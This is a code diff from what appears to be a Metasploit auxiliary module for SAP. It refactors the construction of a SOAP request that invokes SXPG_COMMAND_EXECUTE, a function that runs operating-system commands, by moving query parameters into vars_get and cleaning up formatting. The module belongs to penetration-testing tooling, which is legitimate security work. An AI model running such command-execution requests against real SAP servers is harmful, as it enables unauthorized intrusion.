@@ -94,14 +94,18 @@ class Metasploit4 < Msf::Auxiliary
     print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request")
     begin
       res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+        'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
         'ctype' => 'text/xml; charset=UTF-8',
         'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
-        'headers' =>{
+        'headers' => {
           'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        },
+        'vars_get' => {
+          'sap-client'    => datastore['CLIENT'],
+          'sap-language'  => 'EN'
         }
       })
       if res
